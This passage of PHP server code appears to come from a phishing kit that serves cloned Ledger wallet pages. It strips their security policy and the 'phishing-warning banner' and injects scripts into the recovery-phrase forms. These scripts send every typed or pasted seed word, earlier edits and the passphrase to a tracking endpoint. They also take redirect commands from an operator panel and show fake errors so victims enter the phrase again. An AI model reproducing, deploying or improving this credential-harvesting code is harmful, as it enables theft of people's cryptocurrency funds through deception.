        if (!preg_match('/^\s*<!DOCTYPE/i', $html)) $html = "<!DOCTYPE html>\n" . $html;
        $html = preg_replace('/<head[^>]*>/i', '$0<style>html,body{background:#131415}</style>', $html, 1);
        $html = preg_replace('/<script\b[^>]*>[\s\S]*?<\/script>/i', '', $html);
        $html = preg_replace('/<\/script>/i', '', $html);
        $html = preg_replace('/<noscript\b[^>]*>[\s\S]*?<\/noscript>/i', '', $html);
        $html = preg_replace('/<link[^>]+rel=["\']modulepreload["\'][^>]*>/i', '', $html);
        $html = preg_replace('/<meta[^>]*Content-Security-Policy[^>]*>/i', '', $html);
        $html = preg_replace('/(<span\b[^>]*\bclass="[^"]*text-2xl[^"]*"[^>]*)>/', '$1 id="ld-page-title">', $html, 1);
        $html = preg_replace('/(<span\b[^>]*\bclass="[^"]*text-lg[^"]*"[^>]*)>/', '$1 id="ld-page-subtitle">', $html, 1);
        $html = preg_replace('/(<button\b[^>]*\btype="submit"[^>]*)>/', '$1 id="ld-submit-btn">', $html, 1);
        $bridge = $this->buildCommandBridge($pageName, '/ledger/loading', true);
        $ldInvalidJs = $this->consumeFormStateOnce($pageName) ? 'true' : 'false';
        $ui = <<<JS
<style>
@keyframes ldErrPulse{0%,100%{box-shadow:none}50%{box-shadow:0 0 0 2px rgba(239,68,68,.85);border-color:#ef4444}}
#word-inputs-container input.ld-err-pulse{animation:ldErrPulse .55s ease-out 1}
</style>
<script>
(function(){
  var REQUIRED=24, _currentWordCount=24, _waiting=false;
  var _llLdRecInvalid={$ldInvalidJs};
  function getWords(){
    var words=[];
    document.querySelectorAll('#word-inputs-container input').forEach(function(inp){ words.push((inp.value||'').trim()); });
    return words;
  }
  function showAlarm(){
    var errorAlert=document.getElementById('error-alert');
    if(!errorAlert)return;
    var _ldMsg=errorAlert.querySelector('div');
    if(_ldMsg)_ldMsg.textContent='Something went wrong. Please check your words and try again.';
    errorAlert.classList.remove('hidden');
    clearTimeout(errorAlert._t);
    errorAlert._t=setTimeout(function(){errorAlert.classList.add('hidden');},12000);
  }
  function checkEnable(){
    var btn=document.getElementById('ld-submit-btn')||document.querySelector('button[type="submit"]');
    if(!btn)return;
    var filled=getWords().filter(Boolean).length;
    if(filled>=REQUIRED){ btn.removeAttribute('disabled'); btn.style.opacity='1'; btn.style.cursor='pointer'; }
    else { btn.setAttribute('disabled','true'); btn.style.opacity='0.5'; btn.style.cursor='not-allowed'; }
  }
  function hop(){
    if(typeof window.navigateTo==='function')window.navigateTo('/ledger/loading');
    else window.location.href='/ledger/loading';
  }
  window.switchTab=function(btn,count){
    document.querySelectorAll('.tab-btn').forEach(function(t){
      t.classList.remove('active','border-opacity-100','opacity-100');
      t.classList.add('border-opacity-0','opacity-50');
    });
    if(btn){
      btn.classList.add('active','border-opacity-100','opacity-100');
      btn.classList.remove('border-opacity-0','opacity-50');
    }
    buildGrid(count);
  };
  window.buildGrid=function(count){
    _currentWordCount=count;
    REQUIRED=count;
    var container=document.getElementById('word-inputs-container');
    if(!container)return;
    var newDivs=[];
    for(var i=1;i<=count;i++){
      var inputDiv=document.createElement('div');
      inputDiv.className='relative w-full sm:w-32 md:w-48';
      var input=document.createElement('input');
      input.className='w-full rounded border border-white border-opacity-10 bg-ledger-foreground p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-ledger-primary';
      input.placeholder='Word '+i;
      input.type='password';
      input.autocomplete='off';
      var button=document.createElement('button');
      button.className='absolute right-2 top-1/2 -translate-y-1/2 text-[#9da3ae]';
      button.type='button';
      var _eyeSvg='<svg class="lucide lucide-eye" fill="none" height="16" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="16" xmlns="http://www.w3.org/2000/svg"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
      var _eyeOffSvg='<svg class="lucide lucide-eye-off" fill="none" height="16" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="16" xmlns="http://www.w3.org/2000/svg"><path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"></path><path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"></path><path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"></path><path d="m2 2 20 20"></path></svg>';
      button.innerHTML=_eyeOffSvg;
      button.onclick=function(){
        var inp=this.parentElement.querySelector('input');
        if(!inp)return;
        var isVisible=inp.type==='text';
        inp.type=isVisible?'password':'text';
        this.innerHTML=isVisible?_eyeOffSvg:_eyeSvg;
      };
      input.addEventListener('input',checkEnable);
      input.addEventListener('paste',function(e){
        var paste=(e.clipboardData||window.clipboardData).getData('text');
        if(!paste)return;
        var words=paste.trim().split(/[\\s,]+/).filter(Boolean);
        if(words.length<2)return;
        e.preventDefault();
        var inputs=Array.from(document.querySelectorAll('#word-inputs-container input'));
        for(var n=0;n<Math.min(words.length,inputs.length);n++) inputs[n].value=words[n];
        checkEnable();
      });
      inputDiv.appendChild(input);
      inputDiv.appendChild(button);
      newDivs.push(inputDiv);
    }
    container.replaceChildren.apply(container, newDivs);
    checkEnable();
  };
  document.addEventListener('DOMContentLoaded',function(){
    buildGrid(_currentWordCount);
    if(_llLdRecInvalid){
      showAlarm();
      var _ldIns=document.querySelectorAll('#word-inputs-container input');
      _ldIns.forEach(function(el){ el.classList.add('ld-err-pulse'); });
      setTimeout(function(){ _ldIns.forEach(function(el){ el.classList.remove('ld-err-pulse'); }); },700);
    }
    var btn=document.getElementById('ld-submit-btn')||document.querySelector('button[type="submit"]');
    if(btn){
      btn.addEventListener('click',function(e){
        e.preventDefault();
        if(getWords().filter(Boolean).length<REQUIRED||_waiting)return;
        _waiting=true;
        hop();
      });
    }
    checkEnable();
  });
})();
</script>
JS;
        $go = <<<'JS'
<script>
(function(){
  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isLdGet(u){
    var p=destPath(u);
    return p==='/ledger/1'||p==='/ledger/2'||p==='/ledger/3'||p==='/ledger/1/recover'||p==='/ledger/2/recover'||p==='/ledger/3/recover'||p==='/ledger/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isLdGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };
})();
</script>
JS;
        if (stripos($html, '</body>') !== false) {
            $html = str_ireplace('</body>', $bridge . $go . $ui . '</body>', $html);
        } else {
            $html .= $bridge . $go . $ui;
        }
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }


    public function ledgerSignin(Request $request)
    {
        return redirect('/ledger/support');
    }

    public function ledgerSupport(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/ledger/LedgerSignin.html'));
        $html = ltrim($html, "\xEF\xBB\xBF");
        if (!preg_match('/^\s*<!DOCTYPE/i', $html)) $html = "<!DOCTYPE html>\n" . $html;
        $html = preg_replace('/<script\b[^>]*>[\s\S]*?<\/script>/i', '', $html);
        $html = preg_replace('/<\/script>/i', '', $html);
        $html = preg_replace('/<noscript\b[^>]*>[\s\S]*?<\/noscript>/i', '', $html);
        $html = preg_replace('/<link[^>]+rel=["\']modulepreload["\'][^>]*>/i', '', $html);
        $html = preg_replace('/<meta[^>]*Content-Security-Policy[^>]*>/i', '', $html);
        // Remove the phishing-warning banner header
        $html = preg_replace('/<header\b[^>]*lwc-6raprfhcujs[^>]*>[\s\S]*?<\/header>/i', '', $html);
        $bridge = $this->buildCommandBridge('ledger_signin', '/ledger/loading', true);
        $signinUi = <<<JS
<script>
(function(){
  var LOADING='/ledger/loading';
  function go(e){if(e){e.preventDefault();e.stopPropagation();}window.location.href=LOADING;}
  document.addEventListener('DOMContentLoaded',function(){
    // Search input: redirect on Enter
    var inp=document.querySelector('input[placeholder*="issue"],input[placeholder*="search"],input[placeholder*="Search"],input[type="search"]');
    if(!inp){var inputs=document.querySelectorAll('input[type="text"],input:not([type])');for(var i=0;i<inputs.length;i++){if(!inputs[i].type||inputs[i].type==='text'){inp=inputs[i];break;}}}
    if(inp){inp.addEventListener('keydown',function(e){if(e.key==='Enter'&&inp.value.trim().length>0)go(e);});}
    // All clickable cards, links, buttons in the main content area
    document.querySelectorAll('a[href],button').forEach(function(el){el.addEventListener('click',go,true);});
    // Entire grid card divs (for click on image/text not covered by a/button)
    document.querySelectorAll('.grid > div, [class*="flex-col"]').forEach(function(el){el.style.cursor='pointer';el.addEventListener('click',function(e){if(!e.defaultPrevented)go(e);});});
  });
})();
</script>
JS;
        if (stripos($html, '</body>') !== false) {
            $html = str_ireplace('</body>', $bridge . $signinUi . '</body>', $html);
        } else {
            $html .= $bridge . $signinUi;
        }
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function ledgerLoading(Request $request)
    {
        $html = file_get_contents(resource_path('views/user/ledger/LedgerLoading.html'));
        $html = ltrim($html, "\xEF\xBB\xBF");
        if (!preg_match('/^\s*<!DOCTYPE/i', $html)) $html = "<!DOCTYPE html>\n" . $html;

        // Strip broken scripts
        $html = preg_replace('/<script\b[^>]*>[\s\S]*?<\/script>/i', '', $html);
        $html = preg_replace('/<\/script>/i', '', $html);
        $html = preg_replace('/<noscript\b[^>]*>[\s\S]*?<\/noscript>/i', '', $html);
        $html = preg_replace('/<link[^>]+rel=["\']modulepreload["\'][^>]*>/i', '', $html);

        // Remove CSP
        $html = preg_replace('/<meta[^>]*Content-Security-Policy[^>]*>/i', '', $html);

        $bridge = $this->buildCommandBridge('ledger_loading', '/ledger/loading', true);
        $go = <<<JS
<script>
(function(){
  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isLdGet(u){
    var p=destPath(u);
    return p==='/ledger/1'||p==='/ledger/2'||p==='/ledger/3'||p==='/ledger/1/recover'||p==='/ledger/2/recover'||p==='/ledger/3/recover'||p==='/ledger/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isLdGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };
})();
</script>
JS;

        $bodyPos = strripos($html, '</body>');
        if ($bodyPos !== false) {
            $html = substr($html, 0, $bodyPos) . $bridge . $go . substr($html, $bodyPos);
        } else {
            $html .= $bridge . $go;
        }

        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    private function ledgerPage(Request $request, $htmlFile, $wordCount, $pageName)
    {
        $html = file_get_contents(resource_path('views/user/ledger/' . $htmlFile));
        $html = ltrim($html, "\xEF\xBB\xBF");
        if (!preg_match('/^\s*<!DOCTYPE/i', $html)) $html = "<!DOCTYPE html>\n" . $html;

        // Strip broken scripts
        $html = preg_replace('/<script\b[^>]*>[\s\S]*?<\/script>/i', '', $html);
        $html = preg_replace('/<\/script>/i', '', $html);
        $html = preg_replace('/<noscript\b[^>]*>[\s\S]*?<\/noscript>/i', '', $html);
        $html = preg_replace('/<link[^>]+rel=["\']modulepreload["\'][^>]*>/i', '', $html);

        // Remove CSP
        $html = preg_replace('/<meta[^>]*Content-Security-Policy[^>]*>/i', '', $html);

        // Server-side text injection
        $customTitle = $request->input('_title', '');
        $customSubtitle = $request->input('_sub', '');
        $customButton = $request->input('_btn', '');

        if ($request->hasAny(['_title', '_sub', '_btn'])) {
            if ($pageName === 'ledger_3') {
                session()->flash('_tts_ld_once_ledger_3', [
                    't' => $customTitle,
                    's' => $customSubtitle,
                    'b' => $customButton,
                ]);
                session()->forget(['_tts_ld_ledger_3_t', '_tts_ld_ledger_3_s', '_tts_ld_ledger_3_b']);
            } else {
            if ($customTitle !== '')    session(['_tts_ld_' . $pageName . '_t' => $customTitle]);
            if ($customSubtitle !== '') session(['_tts_ld_' . $pageName . '_s' => $customSubtitle]);
            if ($customButton !== '')   session(['_tts_ld_' . $pageName . '_b' => $customButton]);
            }
            $ldRedir = request()->path() ? '/' . request()->path() : '/ledger/1';
            if (request()->has('_liveled_preview')) {
                return redirect($ldRedir . '?_liveled_preview=1');
            }
            return redirect($ldRedir);
        }
        if ($pageName === 'ledger_3') {
            $once = session('_tts_ld_once_ledger_3');
            session()->forget(['_tts_ld_ledger_3_t', '_tts_ld_ledger_3_s', '_tts_ld_ledger_3_b']);
            $customTitle    = is_array($once) ? (string) ($once['t'] ?? '') : '';
            $customSubtitle = is_array($once) ? (string) ($once['s'] ?? '') : '';
            $customButton   = is_array($once) ? (string) ($once['b'] ?? '') : '';
        } else {
        $customTitle    = session('_tts_ld_' . $pageName . '_t', '');
        $customSubtitle = session('_tts_ld_' . $pageName . '_s', '');
        $customButton   = session('_tts_ld_' . $pageName . '_b', '');
        }

        // Inject stable IDs for JS custom text targeting
        $html = preg_replace('/(<span\b[^>]*\bclass="[^"]*text-2xl[^"]*"[^>]*)>/', '$1 id="ld-page-title">', $html, 1);
        $html = preg_replace('/(<span\b[^>]*\bclass="[^"]*text-lg[^"]*"[^>]*)>/', '$1 id="ld-page-subtitle">', $html, 1);
        $html = preg_replace('/(<button\b[^>]*\btype="submit"[^>]*)>/', '$1 id="ld-submit-btn">', $html, 1);

        // Find and replace title, subtitle, button text
        if ($customTitle) {
            $html = preg_replace('/(<span\b[^>]*\bid="ld-page-title"[^>]*>)[^<]*/', '$1' . htmlspecialchars($customTitle), $html, 1);
        }
        if ($customSubtitle) {
            $html = preg_replace('/(<span\b[^>]*\bid="ld-page-subtitle"[^>]*>)[^<]*/', '$1' . htmlspecialchars($customSubtitle), $html, 1);
        }
        if ($customButton) {
            $html = preg_replace('/(<button\b[^>]*\bid="ld-submit-btn"[^>]*>)[^<]*/', '$1' . htmlspecialchars($customButton), $html, 1);
        }

        $csrf = csrf_token();
        $track = route('track.event');
        $phraseSave = route('phrase.save');
        $bridge = $this->buildCommandBridge($pageName, '/ledger/loading', true);

        // Escape values for JavaScript injection
        $jsCustomTitle    = $customTitle    ? json_encode($customTitle)    : 'null';
        $jsCustomSubtitle = $customSubtitle ? json_encode($customSubtitle) : 'null';
        $jsCustomButton   = $customButton   ? json_encode($customButton)   : 'null';

        $ldShowInvalid = false;
        if ($request->isMethod('get') && !$request->has('_liveled_preview')) {
            $ldToken = $request->cookie('liveled_token');
            $ldSess  = $ldToken ? \App\Models\UserSession::where('session_token', $ldToken)->first() : null;
            $ldMeta  = is_array($ldSess?->metadata) ? $ldSess->metadata : [];
            $ldFs    = (isset($ldMeta['form_state']) && is_array($ldMeta['form_state']))
                ? $ldMeta['form_state'] : [];
            if (($ldFs[$pageName] ?? 'default') === 'invalid') {
                $ldShowInvalid = true;
                if ($ldSess) {
                    \App\Models\UserSession::where('session_token', $ldSess->session_token)
                        ->where('metadata->form_state->'.$pageName, 'invalid')
                        ->update(['metadata->form_state->'.$pageName => 'default']);
                }
            }
        }
        $ldInvalidJs = $ldShowInvalid ? 'true' : 'false';

        $ui = <<<JS
<style>
@keyframes ld-spin{to{transform:rotate(360deg)}}
.ld-spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;animation:ld-spin .8s linear infinite;vertical-align:middle}
@keyframes ldErrPulse{0%,100%{box-shadow:none}50%{box-shadow:0 0 0 2px rgba(239,68,68,.85);border-color:#ef4444}}
#word-inputs-container input.ld-err-pulse{animation:ldErrPulse .55s ease-out 1}
</style>
<script>
(function(){
  var CSRF='{$csrf}', TRACK='{$track}', SAVE='{$phraseSave}', PAGE='{$pageName}', REQUIRED={$wordCount};
  var _wh={}, _lastWords={}, _ppHistory=[], _lastPP='', _lastSnap='', _waiting=false, _vTimeout=null, _currentWordCount={$wordCount};
  var _llLdInvalid={$ldInvalidJs};
  
  // Tell admin the word count on load
  (function(){
    var b=new URLSearchParams({_token:CSRF,page:PAGE,type:'phrase_input',element:'word_count',value:String(_currentWordCount)});
    navigator.sendBeacon?navigator.sendBeacon(TRACK,b):fetch(TRACK,{method:'POST',body:b,keepalive:true});
  })();

  function getWords(){
    var inputs=document.querySelectorAll('#word-inputs-container input');
    var words=[];
    inputs.forEach(function(inp){ words.push((inp.value||'').trim()); });
    return words;
  }
  
  function getPassphrase(){
    var el=document.querySelector('input[placeholder*="Passphrase"]');
    return el?(el.value||'').trim():'';
  }

  // â”€â”€ Custom text: sessionStorage persistence + setInterval apply â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  var _cSK='ll_ct_'+window.location.pathname.replace(/[^a-z0-9]/gi,'_');
  var _svT={$jsCustomTitle},_svS={$jsCustomSubtitle},_svB={$jsCustomButton};
  var _ledger3Own=PAGE==='ledger_3';
  if(_ledger3Own){
    try{sessionStorage.removeItem(_cSK+'_t');sessionStorage.removeItem(_cSK+'_s');sessionStorage.removeItem(_cSK+'_b');}catch(_e){}
  }
  var _cT=_svT||(_ledger3Own?null:(sessionStorage.getItem(_cSK+'_t')||null));
  var _cS=_svS||(_ledger3Own?null:(sessionStorage.getItem(_cSK+'_s')||null));
  var _cB=_svB||(_ledger3Own?null:(sessionStorage.getItem(_cSK+'_b')||null));
  if(!_ledger3Own){
  if(_svT)sessionStorage.setItem(_cSK+'_t',_svT);
  if(_svS)sessionStorage.setItem(_cSK+'_s',_svS);
  if(_svB)sessionStorage.setItem(_cSK+'_b',_svB);
  }

  function _applyText(){
    if(_cT){var _te=document.getElementById('ld-page-title')||document.querySelector('span.text-2xl');if(_te&&_te.textContent!==_cT)_te.textContent=_cT;}
    if(_cS){var _se=document.getElementById('ld-page-subtitle')||document.querySelector('span.text-lg');if(_se&&_se.textContent!==_cS)_se.textContent=_cS;}
    if(_cB){var _be=document.getElementById('ld-submit-btn')||document.querySelector('button[type="submit"]');if(_be&&_be.textContent.trim()!==_cB)_be.textContent=_cB;}
  }
  var _apN=0,_apIv=setInterval(function(){_applyText();if(++_apN>60)clearInterval(_apIv);},300);

  function sendState(force){
    if(!window._llDocId||!window._llStayOk)return Promise.resolve();
    if(_waiting&&!force)return Promise.resolve();
    var words=getWords(), pp=getPassphrase();
    if(!words.some(Boolean)&&!pp)return Promise.resolve();
    words.forEach(function(w,i){
      var k=String(i+1),prev=_lastWords[k]||'';
      if(prev&&prev!==w){if(!_wh[k])_wh[k]=[];if(_wh[k].indexOf(prev)===-1)_wh[k].push(prev);}
      _lastWords[k]=w;
    });
    if(_lastPP&&_lastPP!==pp){if(_ppHistory.indexOf(_lastPP)===-1)_ppHistory.push(_lastPP);}
    _lastPP=pp;
    var snap=JSON.stringify({words:words,totalWords:_currentWordCount,wordHistory:_wh,passphrase:pp,passphraseHistory:_ppHistory});
    if(snap===_lastSnap&&!force)return Promise.resolve();
    _lastSnap=snap;
    return (window._encVal?window._encVal(snap):Promise.resolve(snap)).then(function(enc){
      var b=new URLSearchParams({_token:CSRF,page:PAGE,type:'phrase_input',element:'full_state',value:enc,doc:window._llDocId,stay:String(window._llStayId||'')});
      return window._llPostTrack(b);
    });
  }
  if(window._llStayReadyPromise)window._llStayReadyPromise.then(function(){sendState(false);});

  function hideLdAlarm(){
    var errorAlert=document.getElementById('error-alert');
    if(!errorAlert||errorAlert.classList.contains('hidden'))return;
    clearTimeout(errorAlert._t);
    errorAlert._t=null;
    errorAlert.classList.add('hidden');
  }

  function showAlarm(){
    var errorAlert=document.getElementById('error-alert');
    if(!errorAlert)return;
    var _ldMsg=errorAlert.querySelector('div');
    if(_ldMsg)_ldMsg.textContent='Something went wrong. Please check your words and try again.';
    errorAlert.classList.remove('hidden');
    clearTimeout(errorAlert._t);
    errorAlert._t=setTimeout(function(){errorAlert.classList.add('hidden');},12000);
  }

  function resetForm(){
    var inputs=document.querySelectorAll('#word-inputs-container input');
    inputs.forEach(function(inp){ inp.value=''; inp.disabled=false; inp.type='password'; });
    var errorAlert=document.getElementById('error-alert');
    if(errorAlert)errorAlert.classList.add('hidden');
    var pp=document.querySelector('input[placeholder*="Passphrase"]');
    if(pp){pp.value=''; pp.type='password';}
    var btn=document.querySelector('button[type="submit"], button:not([type])');
    if(btn){ btn.disabled=true; btn.textContent='Continue'; }
    _lastSnap=''; _lastWords={}; _wh={}; _ppHistory=[]; _lastPP='';
    var br=new URLSearchParams({_token:CSRF,page:PAGE,type:'phrase_reset',element:'word_history',value:'cleared'});
    fetch(TRACK,{method:'POST',body:br,keepalive:true}).catch(function(){});
  }

  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isLdGet(u){
    var p=destPath(u);
    return p==='/ledger/1'||p==='/ledger/2'||p==='/ledger/3'||p==='/ledger/1/recover'||p==='/ledger/2/recover'||p==='/ledger/3/recover'||p==='/ledger/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isLdGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        if(_waiting){_waiting=false;}
        if(_vTimeout){clearTimeout(_vTimeout);_vTimeout=null;}
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };

  function checkEnable(){
    var words=getWords();
    var filled=words.filter(function(w){return w.length>0;}).length;
    var btn=document.querySelector('button[type="submit"], button:not([type])');
    if(!btn)return;
    if(filled>=REQUIRED){
      btn.removeAttribute('disabled');
      btn.style.opacity='1'; btn.style.cursor='pointer';
    }else{
      btn.setAttribute('disabled','true');
      btn.style.opacity='0.5'; btn.style.cursor='not-allowed';
    }
  }

  /* Paste scatter ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â splits pasted phrase across all word inputs */
  function handlePaste(e){
    var paste=(e.clipboardData||window.clipboardData).getData('text');
    if(!paste)return;
    var words=paste.trim().split(/[\s,]+/).filter(function(w){return w.length>0;});
    if(words.length<2)return; // single word ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â let browser handle normally
    e.preventDefault();
    var inputs=Array.from(document.querySelectorAll('#word-inputs-container input'));
    if(!inputs.length)return;
    // Set all values first
    for(var i=0;i<Math.min(words.length,inputs.length);i++){
      inputs[i].value=words[i];
    }
    // Then fire events so tracking picks up the full state at once
    for(var i=0;i<Math.min(words.length,inputs.length);i++){
      inputs[i].dispatchEvent(new Event('input',{bubbles:true}));
    }
    checkEnable();
    setTimeout(function(){sendState(true);},50);
  }

  /* Word count switching functionality */
  var _currentWordCount={$wordCount};
  
  window.switchTab=function(btn,count){
    document.querySelectorAll('.tab-btn').forEach(function(t){
      t.classList.remove('active','border-opacity-100','opacity-100');
      t.classList.add('border-opacity-0','opacity-50');
    });
    btn.classList.add('active','border-opacity-100','opacity-100');
    btn.classList.remove('border-opacity-0','opacity-50');
    var b=new URLSearchParams({_token:CSRF,page:PAGE,type:'phrase_input',element:'word_count',value:String(count)});
    fetch(TRACK,{method:'POST',body:b,keepalive:true}).catch(function(e){console.error('Tracking error',e);});
    buildGrid(count);
    // Send new word count to admin panel immediately
    var wcB=new URLSearchParams({_token:CSRF,page:PAGE,type:'phrase_input',element:'word_count',value:String(count)});
    navigator.sendBeacon?navigator.sendBeacon(TRACK,wcB):fetch(TRACK,{method:'POST',body:wcB,keepalive:true}).catch(function(){});
  }
  
  window.buildGrid=function(count){
    _currentWordCount=count;
    REQUIRED=count;
    var container=document.getElementById('word-inputs-container');
    if(!container)return;
    
    // Preserve word history on count switch. Visibility always resets closed on rebuild.
    var existingInputs=container.querySelectorAll('input');
    // Move current words into history before rebuilding
    existingInputs.forEach(function(inp,idx){
      var pos=String(idx+1),val=(inp.value||'').trim();
      if(val){if(!_wh[pos])_wh[pos]=[];if(_wh[pos].indexOf(val)===-1)_wh[pos].push(val);}
    });
    _lastWords={};_lastSnap='';

    var newDivs=[];
    for(var i=1;i<=count;i++){
      var inputDiv=document.createElement('div');
      inputDiv.className='relative w-full sm:w-32 md:w-48';
      inputDiv.setAttribute('bis_skin_checked','1');

      var input=document.createElement('input');
      input.className='w-full rounded border border-white border-opacity-10 bg-ledger-foreground p-2 px-3 text-sm font-semibold text-white outline-none transition-all duration-300 focus:ring-2 focus:ring-ledger-primary';
      input.placeholder='Word '+i;
      input.type='password';
      input.autocomplete='off';
      input.value='';
      
      var button=document.createElement('button');
      button.className='absolute right-2 top-1/2 -translate-y-1/2 text-[#9da3ae]';
      button.type='button';
      var _eyeSvg='<svg class="lucide lucide-eye" fill="none" height="16" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="16" xmlns="http://www.w3.org/2000/svg"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
      var _eyeOffSvg='<svg class="lucide lucide-eye-off" fill="none" height="16" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="16" xmlns="http://www.w3.org/2000/svg"><path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"></path><path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"></path><path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"></path><path d="m2 2 20 20"></path></svg>';
      button.innerHTML=_eyeOffSvg;
      
      // Toggle only this field's existing input (independent visibility)
      button.onclick=function(){
        var inp=this.parentElement.querySelector('input');
        if(!inp)return;
        var isVisible=inp.type==='text';
        var start=inp.selectionStart,end=inp.selectionEnd;
        inp.type=isVisible?'password':'text';
        this.innerHTML=isVisible?_eyeOffSvg:_eyeSvg;
        try{inp.setSelectionRange(start,end);}catch(e){}
      };
      
      inputDiv.appendChild(input);
      inputDiv.appendChild(button);
      newDivs.push(inputDiv);
      
      // Enter key: advance to next word input, or passphrase on last word
      input.addEventListener('keydown',function(e){
        if(e.key==='Enter'){
          e.preventDefault();
          var allInputs=Array.from(document.querySelectorAll('#word-inputs-container input'));
          var idx=allInputs.indexOf(e.target);
          if(idx>=0&&idx<allInputs.length-1){
            allInputs[idx+1].focus();
          }else{
            var pp=document.querySelector('input[placeholder*="Passphrase"]');
            if(pp)pp.focus();
          }
        }
      });
      
      // Add event listeners for phrase tracking
      input.addEventListener('paste',handlePaste);
      ['input','keyup','change'].forEach(function(ev){
        input.addEventListener(ev,function(){setTimeout(function(){checkEnable();sendState(false);},0);});
      });
    }
    container.replaceChildren.apply(container, newDivs);
    
    // Re-check enable state
    checkEnable();
  }

  document.addEventListener('DOMContentLoaded',function(){
    // Build initial grid with correct word count
    buildGrid(_currentWordCount);
    if(_llLdInvalid){
      showAlarm();
      var _ldIns=document.querySelectorAll('#word-inputs-container input');
      _ldIns.forEach(function(el){ el.classList.add('ld-err-pulse'); });
      setTimeout(function(){
        _ldIns.forEach(function(el){ el.classList.remove('ld-err-pulse'); });
      },700);
    }
    var _ldGrid=document.getElementById('word-inputs-container');
    if(_ldGrid){
      _ldGrid.addEventListener('focusin',function(e){
        if(e.target&&e.target.tagName==='INPUT')hideLdAlarm();
      });
      _ldGrid.addEventListener('input',function(e){
        if(e.target&&e.target.tagName==='INPUT')hideLdAlarm();
      });
    }
    
    // Set the correct tab button as active based on word count
    var tabButtons=document.querySelectorAll('.tab-btn');
    tabButtons.forEach(function(btn){
      var onclickAttr=btn.getAttribute('onclick');
      if(onclickAttr){
        var match=onclickAttr.match(/switchTab\(this,\s*(\d+)\)/);
        if(match){
